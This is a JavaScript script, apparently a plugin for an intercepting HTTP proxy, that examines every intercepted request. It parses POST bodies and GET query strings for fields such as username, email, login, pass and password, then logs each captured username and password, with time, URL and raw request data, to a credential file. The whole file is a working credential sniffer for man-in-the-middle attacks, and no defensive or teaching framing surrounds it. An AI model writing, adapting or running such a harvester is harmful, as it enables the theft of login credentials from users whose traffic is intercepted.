var LOGFILE = "__CRED_FILE__";

function writeLog(msg) {
    try {
        var f = new File(LOGFILE);
        f.open("a");
        f.write(msg + "\n");
        f.close();
    } catch (e) {}
}

function parseForm(body) {
    var result = {};
    if (!body) return result;
    var pairs = body.split("&");
    for (var i = 0; i < pairs.length; i++) {
        var kv = pairs[i].split("=");
        if (kv.length === 2) {
            var key = decodeURIComponent(kv[0].replace(/\+/g, " "));
            var val = decodeURIComponent(kv[1].replace(/\+/g, " "));
            result[key.toLowerCase()] = val;
        }
    }
    return result;
}

function onRequest(req, res) {
    var foundUser = null;
    var foundPass = null;
    var data = "";

    if (req.Method === "POST" && req.Body) {
        data = req.Body;
        var fields = parseForm(data);
        var userKeys = ["user", "username", "usr", "login", "email", "name", "account"];
        var passKeys = ["pass", "password", "passwd", "pwd", "pass1", "passcode"];
        for (var i = 0; i < userKeys.length; i++) {
            if (fields[userKeys[i]]) { foundUser = fields[userKeys[i]]; break; }
        }
        for (var i = 0; i < passKeys.length; i++) {
            if (fields[passKeys[i]]) { foundPass = fields[passKeys[i]]; break; }
        }
    }

    if (req.Method === "GET" && req.Path) {
        var qIdx = req.Path.indexOf("?");
        if (qIdx !== -1) {
            data = req.Path.substring(qIdx + 1);
            var fields = parseForm(data);
            var userKeys = ["user", "username", "usr", "login", "email", "name", "account"];
            var passKeys = ["pass", "password", "passwd", "pwd", "pass1", "passcode"];
            for (var i = 0; i < userKeys.length; i++) {
                if (fields[userKeys[i]]) { foundUser = fields[userKeys[i]]; break; }
            }
            for (var i = 0; i < passKeys.length; i++) {
                if (fields[passKeys[i]]) { foundPass = fields[passKeys[i]]; break; }
            }
        }
    }

    if (foundUser !== null || foundPass !== null) {
        var line = "========================================\n";
        line += "TIME  : " + new Date().toString() + "\n";
        line += "METHOD: " + req.Method + "\n";
        line += "URL   : http://" + (req.Host || "unknown") + (req.Path || "unknown") + "\n";
        line += "USER  : " + (foundUser !== null ? foundUser : "(not found)") + "\n";
        line += "PASS  : " + (foundPass !== null ? foundPass : "(not found)") + "\n";
        line += "DATA  : " + data + "\n";
        line += "========================================";
        log(line);
        writeLog(line);
    }
}
